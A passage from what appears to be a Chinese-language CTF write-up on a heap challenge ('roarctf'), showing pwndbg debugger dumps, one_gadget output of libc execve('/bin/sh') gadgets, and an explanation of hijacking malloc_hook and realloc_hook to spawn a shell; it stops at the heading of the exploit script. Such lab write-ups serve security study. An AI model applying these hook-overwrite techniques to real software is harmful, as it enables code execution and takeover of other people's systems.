class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RAX  <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RCX  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x11</span></span><br><span class=\"line\"> RDI  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSI  <span class=\"number\">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"> R8   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R9   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R10  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R11  <span class=\"number\">0x7f55c10ef6e0</span> (_nl_C_LC_CTYPE_class+<span class=\"number\">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class=\"line\"> R12  <span class=\"number\">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class=\"line\"> R13  <span class=\"number\">0x7ffc37dd49f0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"> R14  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R15  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBP  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSP  <span class=\"number\">0x7ffc37dd48a0</span> ◂— <span class=\"number\">0x7</span></span><br><span class=\"line\"> RIP  <span class=\"number\">0x7f55c0ffd028</span> (<span class=\"built_in\">calloc</span>+<span class=\"number\">680</span>) ◂— call   rax</span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\"> ► <span class=\"number\">0x7f55c0ffd028</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">680</span>&gt;    call   rax</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd02a</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">682</span>&gt;    xor    esi, esi</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd02c</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">684</span>&gt;    test   rax, rax</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd02f</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">687</span>&gt;    mov    rdx, rbp</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd032</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">690</span>&gt;    mov    rdi, rax</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd035</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">693</span>&gt;    jne    <span class=\"built_in\">calloc</span>+<span class=\"number\">656</span> &lt;<span class=\"number\">0x7f55c0ffd010</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd037</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">695</span>&gt;    xor    eax, eax</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd039</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">697</span>&gt;    jmp    <span class=\"built_in\">calloc</span>+<span class=\"number\">312</span> &lt;<span class=\"number\">0x7f55c0ffceb8</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd03e</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">702</span>&gt;    nop    </span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd040</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">704</span>&gt;    mov    rax, qword ptr [rip + <span class=\"number\">0x33ee31</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f55c0ffd047</span> &lt;<span class=\"built_in\">calloc</span>+<span class=\"number\">711</span>&gt;    mov    dword ptr fs:[rax], <span class=\"number\">0xc</span></span><br><span class=\"line\">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp  <span class=\"number\">0x7ffc37dd48a0</span> ◂— <span class=\"number\">0x7</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│      <span class=\"number\">0x7ffc37dd48a8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│      <span class=\"number\">0x7ffc37dd48b0</span> —▸ <span class=\"number\">0x7ffc37dd48f0</span> —▸ <span class=\"number\">0x7ffc37dd4910</span> —▸ <span class=\"number\">0x55fafa1d42c0</span> ◂— push   r15</span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│      <span class=\"number\">0x7ffc37dd48b8</span> —▸ <span class=\"number\">0x55fafa1d39a0</span> ◂— xor    ebp, ebp</span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│      <span class=\"number\">0x7ffc37dd48c0</span> —▸ <span class=\"number\">0x7ffc37dd49f0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│      <span class=\"number\">0x7ffc37dd48c8</span> —▸ <span class=\"number\">0x55fafa1d3cd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│      <span class=\"number\">0x7ffc37dd48d0</span> ◂— <span class=\"number\">0x7fa1d39a0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│      <span class=\"number\">0x7ffc37dd48d8</span> ◂— <span class=\"number\">0x100000010</span></span><br><span class=\"line\">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class=\"line\"> ► f <span class=\"number\">0</span>     <span class=\"number\">7f</span>55c0ffd028 <span class=\"built_in\">calloc</span>+<span class=\"number\">680</span></span><br><span class=\"line\">   f <span class=\"number\">1</span>     <span class=\"number\">55f</span>afa1d3cd1</span><br><span class=\"line\">   f <span class=\"number\">2</span>        <span class=\"number\">7f</span>a1d39a0</span><br><span class=\"line\">   f <span class=\"number\">3</span>        <span class=\"number\">100000010</span></span><br><span class=\"line\">   f <span class=\"number\">4</span>        <span class=\"number\">100000006</span></span><br><span class=\"line\">   f <span class=\"number\">5</span>  <span class=\"number\">3b</span>dcd6e58a0f900</span><br><span class=\"line\">   f <span class=\"number\">6</span>     <span class=\"number\">7f</span>fc37dd4910</span><br><span class=\"line\">   f <span class=\"number\">7</span>     <span class=\"number\">55f</span>afa1d4258</span><br><span class=\"line\">   f <span class=\"number\">8</span>        <span class=\"number\">137</span>dd49f0</span><br><span class=\"line\">   f <span class=\"number\">9</span>  <span class=\"number\">3b</span>dcd6e58a0f900</span><br><span class=\"line\">   f <span class=\"number\">10</span>     <span class=\"number\">55f</span>afa1d42c0</span><br><span class=\"line\">Program received signal <span class=\"title function_\">SIGSEGV</span> <span class=\"params\">(fault address <span class=\"number\">0x0</span>)</span></span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">stack</span> 40</span><br><span class=\"line\">00:0000│ rsp  0x7ffc37dd48a0 ◂— 0x7</span><br><span class=\"line\">01:0008│      0x7ffc37dd48a8 ◂— 0x0</span><br><span class=\"line\">02:0010│      0x7ffc37dd48b0 —▸ 0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class=\"line\">03:0018│      0x7ffc37dd48b8 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">04:0020│      0x7ffc37dd48c0 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class=\"line\">05:0028│      0x7ffc37dd48c8 —▸ 0x55fafa1d3cd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class=\"line\">06:0030│      0x7ffc37dd48d0 ◂— 0x7fa1d39a0</span><br><span class=\"line\">07:0038│      0x7ffc37dd48d8 ◂— 0x100000010</span><br><span class=\"line\">08:0040│      0x7ffc37dd48e0 ◂— 0x100000006</span><br><span class=\"line\">09:0048│      0x7ffc37dd48e8 ◂— 0x3bdcd6e58a0f900</span><br><span class=\"line\">0a:0050│      0x7ffc37dd48f0 —▸ 0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class=\"line\">0b:0058│      0x7ffc37dd48f8 —▸ 0x55fafa1d4258 ◂— jmp    0x55fafa1d42ad</span><br><span class=\"line\">0c:0060│      0x7ffc37dd4900 ◂— 0x137dd49f0</span><br><span class=\"line\">0d:0068│      0x7ffc37dd4908 ◂— 0x3bdcd6e58a0f900</span><br><span class=\"line\">0e:0070│      0x7ffc37dd4910 —▸ 0x55fafa1d42c0 ◂— push   r15</span><br><span class=\"line\">0f:0078│      0x7ffc37dd4918 —▸ 0<span class=\"title function_\">x7f55c0f98840</span> <span class=\"params\">(__libc_start_main+<span class=\"number\">240</span>)</span> ◂— mov    edi, eax</span><br><span class=\"line\">10:0080│      0x7ffc37dd4920 —▸ 0x7ffc37dd49f8 —▸ 0x7ffc37dd6080 ◂— &#x27;./roarctf&#x27;</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">12:0090│      0x7ffc37dd4930 ◂— 0x1c1104708</span><br><span class=\"line\">13:0098│      0x7ffc37dd4938 —▸ 0x55fafa1d41ec ◂— push   rbp</span><br><span class=\"line\">14:00a0│      0x7ffc37dd4940 ◂— 0x0</span><br><span class=\"line\">15:00a8│      0x7ffc37dd4948 ◂— 0x21d72319ef57efa6</span><br><span class=\"line\">16:00b0│      0x7ffc37dd4950 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">17:00b8│      0x7ffc37dd4958 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class=\"line\">18:00c0│      0x7ffc37dd4960 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">1a:00d0│      0x7ffc37dd4970 ◂— 0x75dab899f897efa6</span><br><span class=\"line\">1b:00d8│      0x7ffc37dd4978 ◂— 0x748956d06527efa6</span><br><span class=\"line\">1c:00e0│      0x7ffc37dd4980 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">1f:00f8│      0x7ffc37dd4998 —▸ 0x7ffc37dd4a08 —▸ 0x7ffc37dd608a ◂— 0<span class=\"title function_\">x52454d554e5f434c</span> <span class=\"params\">(<span class=\"string\">&#x27;LC_NUMER&#x27;</span>)</span></span><br><span class=\"line\">20:0100│      0x7ffc37dd49a0 —▸ 0x7f55c1569168 —▸ 0x55fafa1d3000 ◂— jg     0x55fafa1d3047</span><br><span class=\"line\">21:0108│      0x7ffc37dd49a8 —▸ 0<span class=\"title function_\">x7f55c135280b</span> <span class=\"params\">(_dl_init+<span class=\"number\">139</span>)</span> ◂— jmp    0x7f55c13527e0</span><br><span class=\"line\">22:0110│      0x7ffc37dd49b0 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">24:0120│      0x7ffc37dd49c0 —▸ 0x55fafa1d39a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">25:0128│      0x7ffc37dd49c8 —▸ 0x7ffc37dd49f0 ◂— 0x1</span><br><span class=\"line\">26:0130│      0x7ffc37dd49d0 ◂— 0x0</span><br><span class=\"line\">27:0138│      0x7ffc37dd49d8 —▸ 0x55fafa1d39c9 ◂— hlt    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们来看看 onegadegt:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ one_gadget /lib/x86_64-linux-gnu/libc.so<span class=\"number\">.6</span> -l3</span><br><span class=\"line\">/var/lib/gems/<span class=\"number\">2.3</span><span class=\"number\">.0</span>/gems/one_gadget<span class=\"number\">-1.6</span><span class=\"number\">.2</span>/lib/one_gadget/fetchers/base.rb:<span class=\"number\">45</span>: warning: Insecure world writable dir /home/giantbranch in PATH, mode <span class=\"number\">040777</span></span><br><span class=\"line\"><span class=\"number\">0x45226</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x30</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  rax == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x4527a</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x30</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x30</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xcd173</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, r12)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == <span class=\"literal\">NULL</span> || rcx == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [r12] == <span class=\"literal\">NULL</span> || r12 == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xcd248</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rax, r12)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rax] == <span class=\"literal\">NULL</span> || rax == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [r12] == <span class=\"literal\">NULL</span> || r12 == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf03a4</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x50</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x50</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf03b0</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsi] == <span class=\"literal\">NULL</span> || rsi == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [[rax]] == <span class=\"literal\">NULL</span> || [rax] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf1247</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0xf67f0</span>\texecve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, [rbp<span class=\"number\">-0xf8</span>])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == <span class=\"literal\">NULL</span> || rcx == <span class=\"literal\">NULL</span></span><br><span class=\"line\">  [[rbp<span class=\"number\">-0xf8</span>]] == <span class=\"literal\">NULL</span> || [rbp<span class=\"number\">-0xf8</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这个时候我们尝试 realloc_hook,mallo_hook 复写为 realloc，realloc_hook 写为 onegadget ,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class=\"line\"> RAX  <span class=\"number\">0xcafebabedeadbeef</span></span><br><span class=\"line\"> RBX  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RCX  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RDX  <span class=\"number\">0x7f31162cc02a</span> (<span class=\"built_in\">calloc</span>+<span class=\"number\">682</span>) ◂— xor    esi, esi</span><br><span class=\"line\"> RDI  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSI  <span class=\"number\">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"> R8   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R9   <span class=\"number\">0x0</span></span><br><span class=\"line\"> R10  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R11  <span class=\"number\">0x7f31163be6e0</span> (_nl_C_LC_CTYPE_class+<span class=\"number\">256</span>) ◂— add    al, byte ptr [rax]</span><br><span class=\"line\"> R12  <span class=\"number\">0x55fc4e86dcd1</span> ◂— mov    qword ptr [rbp - <span class=\"number\">0x10</span>], rax</span><br><span class=\"line\"> R13  <span class=\"number\">0x7ffedb4e1860</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"> R14  <span class=\"number\">0x0</span></span><br><span class=\"line\"> R15  <span class=\"number\">0x0</span></span><br><span class=\"line\"> RBP  <span class=\"number\">0x10</span></span><br><span class=\"line\"> RSP  <span class=\"number\">0x7ffedb4e16a0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"> RIP  <span class=\"number\">0x7f31162cb95d</span> (<span class=\"built_in\">realloc</span>+<span class=\"number\">589</span>) ◂— call   rax</span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\"> ► <span class=\"number\">0x7f31162cb95d</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">589</span>&gt;    call   rax</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb95f</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">591</span>&gt;    mov    rbp, rax</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb962</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">594</span>&gt;    jmp    <span class=\"built_in\">realloc</span>+<span class=\"number\">213</span> &lt;<span class=\"number\">0x7f31162cb7e5</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb967</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">599</span>&gt;    nop    word ptr [rax + rax]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb970</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">608</span>&gt;    mov    rax, qword ptr [rip + <span class=\"number\">0x33f501</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb977</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">615</span>&gt;    xor    ebp, ebp</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb979</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">617</span>&gt;    mov    dword ptr fs:[rax], <span class=\"number\">0xc</span></span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb980</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">624</span>&gt;    jmp    <span class=\"built_in\">realloc</span>+<span class=\"number\">213</span> &lt;<span class=\"number\">0x7f31162cb7e5</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb985</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">629</span>&gt;    nop    dword ptr [rax]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb988</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">632</span>&gt;    lea    rax, [r15 - <span class=\"number\">8</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f31162cb98c</span> &lt;<span class=\"built_in\">realloc</span>+<span class=\"number\">636</span>&gt;    mov    rbp, rbx</span><br><span class=\"line\">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ rsp  <span class=\"number\">0x7ffedb4e16a0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│      <span class=\"number\">0x7ffedb4e16b0</span> —▸ <span class=\"number\">0x7f311681c700</span> ◂— <span class=\"number\">0x7f311681c700</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│      <span class=\"number\">0x7ffedb4e16b8</span> ◂— <span class=\"number\">9</span> <span class=\"comment\">/* &#x27;\\t&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│      <span class=\"number\">0x7ffedb4e16c0</span> —▸ <span class=\"number\">0x7f311660c6a3</span> (_IO_2_1_stdout_+<span class=\"number\">131</span>) ◂— <span class=\"number\">0x60d780000000000a</span> <span class=\"comment\">/* &#x27;\\n&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│      <span class=\"number\">0x7ffedb4e16c8</span> —▸ <span class=\"number\">0x7ffedb4e1860</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│      <span class=\"number\">0x7ffedb4e16d0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">... ↓</span><br><span class=\"line\">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class=\"line\"> ► f <span class=\"number\">0</span>     <span class=\"number\">7f</span>31162cb95d <span class=\"built_in\">realloc</span>+<span class=\"number\">589</span></span><br><span class=\"line\">   f <span class=\"number\">1</span>     <span class=\"number\">7f</span>31162cc02a <span class=\"built_in\">calloc</span>+<span class=\"number\">682</span></span><br><span class=\"line\">   f <span class=\"number\">2</span>     <span class=\"number\">55f</span>c4e86dcd1</span><br><span class=\"line\">   f <span class=\"number\">3</span>        <span class=\"number\">74e86</span>d9a0</span><br><span class=\"line\">   f <span class=\"number\">4</span>        <span class=\"number\">100000010</span></span><br><span class=\"line\">   f <span class=\"number\">5</span>        <span class=\"number\">100000006</span></span><br><span class=\"line\">   f <span class=\"number\">6</span> <span class=\"number\">54</span>a26cc778083a00</span><br><span class=\"line\">   f <span class=\"number\">7</span>     <span class=\"number\">7f</span>fedb4e1780</span><br><span class=\"line\">   f <span class=\"number\">8</span>     <span class=\"number\">55f</span>c4e86e258</span><br><span class=\"line\">   f <span class=\"number\">9</span>        <span class=\"number\">1</span>db4e1860</span><br><span class=\"line\">   f <span class=\"number\">10</span> <span class=\"number\">54</span>a26cc778083a00</span><br><span class=\"line\">Program received signal <span class=\"title function_\">SIGSEGV</span> <span class=\"params\">(fault address <span class=\"number\">0x0</span>)</span></span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">stack</span> 20</span><br><span class=\"line\">00:0000│ rsp  0x7ffedb4e16a0 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">02:0010│      0x7ffedb4e16b0 —▸ 0x7f311681c700 ◂— 0x7f311681c700</span><br><span class=\"line\">03:0018│      0x7ffedb4e16b8 ◂— 9 <span class=\"comment\">/* &#x27;\\t&#x27; */</span></span><br><span class=\"line\">04:0020│      0x7ffedb4e16c0 —▸ 0<span class=\"title function_\">x7f311660c6a3</span> <span class=\"params\">(_IO_2_1_stdout_+<span class=\"number\">131</span>)</span> ◂— 0x60d780000000000a <span class=\"comment\">/* &#x27;\\n&#x27; */</span></span><br><span class=\"line\">05:0028│      0x7ffedb4e16c8 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class=\"line\">06:0030│      0x7ffedb4e16d0 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">08:0040│      0x7ffedb4e16e0 ◂— 0x10</span><br><span class=\"line\">09:0048│      0x7ffedb4e16e8 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">0a:0050│      0x7ffedb4e16f0 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class=\"line\">0b:0058│      0x7ffedb4e16f8 ◂— 0x0</span><br><span class=\"line\">... ↓</span><br><span class=\"line\">0d:0068│      0x7ffedb4e1708 —▸ 0<span class=\"title function_\">x7f31162cc02a</span> <span class=\"params\">(<span class=\"built_in\">calloc</span>+<span class=\"number\">682</span>)</span> ◂— xor    esi, esi</span><br><span class=\"line\">0e:0070│      0x7ffedb4e1710 ◂— 0x7</span><br><span class=\"line\">0f:0078│      0x7ffedb4e1718 ◂— 0x0</span><br><span class=\"line\">10:0080│      0x7ffedb4e1720 —▸ 0x7ffedb4e1760 —▸ 0x7ffedb4e1780 —▸ 0x55fc4e86e2c0 ◂— push   r15</span><br><span class=\"line\">11:0088│      0x7ffedb4e1728 —▸ 0x55fc4e86d9a0 ◂— xor    ebp, ebp</span><br><span class=\"line\">12:0090│      0x7ffedb4e1730 —▸ 0x7ffedb4e1860 ◂— 0x1</span><br><span class=\"line\">13:0098│      0x7ffedb4e1738 —▸ 0x55fc4e86dcd1 ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里 rsp+0x30 为 0，就满足了一个 onegadget.</p>\n<p>有时候 realloc 仍旧无法满足，那么我们尝试 realloc 偏移，realloc 调栈 的原理在于其调用 realloc_hook 前，会有多个 push 操作，利用这个可以是默写栈空间经过操作偏移后，满足要求。</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp:</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span 